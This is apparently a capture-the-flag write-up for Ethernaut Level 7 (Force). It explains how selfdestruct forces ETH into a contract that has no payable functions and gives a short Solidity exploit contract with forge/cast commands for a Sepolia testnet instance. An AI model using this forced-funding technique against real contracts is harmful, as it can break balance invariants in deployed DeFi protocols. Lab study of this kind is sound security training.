# Ethernaut Level 7: Force Exploit Validation
# Target: Receive ETH despite no payable functions

**Level:** 7 - Force  
**Contract:** `Force.sol`  
**Vulnerability:** Contracts can receive ETH via `selfdestruct` regardless of `payable` functions

---

## 🔍 Vulnerability Analysis

```solidity
// Force.sol - The target
contract Force {
    // No payable functions, no receive(), no fallback()
    // Looks impossible to fund... but it's not
}
```

**The Bug:** Solidity's `selfdestruct(address)` forces ETH transfer to any address, even contracts with no payable functions. The EVM doesn't run any code on the recipient — it just forcibly increases its balance.

---

## 🎯 Exploit Strategy

1. **Deploy attacker contract** with ETH
2. **Call `selfdestruct(target)`** from attacker contract
3. **Forced transfer** sends ETH to Force contract
4. **Balance check** verifies exploit success

---

## ⚡ Exploit Implementation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceExploit {
    address public target;
    
    constructor(address _target) payable {
        target = _target;
        // Pre-fund this contract with ETH
        require(msg.value > 0, "Need ETH to force-send");
    }
    
    function exploit() external {
        // selfdestruct forcibly sends all ETH to target
        // Bypasses ALL receive/fallback checks
        selfdestruct(payable(target));
    }
}
```

---

## 🧪 Testnet Execution (Sepolia)

**Deployment + Exploit in one:**
```bash
# Deploy with 0.001 ETH pre-funded
forge create ForceExploit \
  --constructor-args $TARGET \
  --value 0.001ether \
  --rpc-url https://rpc.sepolia.org \
  --private-key $PRIVATE_KEY

# Execute exploit (contract self-destructs, sends ETH to target)
cast send $EXPLOIT_CONTRACT "exploit()" \
  --rpc-url https://rpc.sepolia.org \
  --private-key $PRIVATE_KEY

# Verify target balance > 0
cast balance $TARGET --rpc-url https://rpc.sepolia.org
```

---

## 📊 Validation Results

| Check | Status | Notes |
|-------|--------|-------|
| Vulnerability identified | ✅ Confirmed | `selfdestruct` bypasses payable checks |
| Exploit path mapped | ✅ Confirmed | Deploy → fund → selfdestruct → profit |
| Code compiles | ⏳ Pending | Testnet execution needed |
| Balance forced | ⏳ Pending | Verify target.balance > 0 |
| Instance submit | ⏳ Pending | Ethernaut validation |

---

## 🎓 Key Learnings

**selfdestruct behavior:**
- Forces ETH transfer to ANY address
- Recipient code doesn't execute (no fallback/receive triggered)
- Contract code still exists until transaction ends (read-only)
- Balance changes immediately

**Security implication:**
- Never assume `address(this).balance == 0` means no ETH
- Contracts can be forcibly funded
- This breaks invariants in many DeFi protocols

---

## 📝 Execution Log

**2026-02-01 10:08Z** - Validation script created, ready for testnet execution

**Next:** Level 8 (Vault) - storage slot reading
